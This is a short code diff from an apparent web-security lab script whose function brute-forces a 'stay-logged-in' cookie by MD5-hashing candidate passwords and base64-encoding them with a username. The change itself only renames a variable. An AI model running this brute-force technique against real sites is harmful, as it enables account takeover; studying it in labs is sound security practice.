@@ -47,11 +47,11 @@ def brute_force_password(start_time, url, valid_user, passwords):
         password_hash = hashlib.md5(password.encode()).hexdigest()
         
         # encrypt the password hash with username
-        cookie_encrypted = base64.b64encode(f"{valid_user}:{password_hash}".encode()).decode()
+        cookie_encoded = base64.b64encode(f"{valid_user}:{password_hash}".encode()).decode()
         
         # set headers
         headers = {
-            "Cookie": f"stay-logged-in={cookie_encrypted}"
+            "Cookie": f"stay-logged-in={cookie_encoded}"
         }
 
         try:  
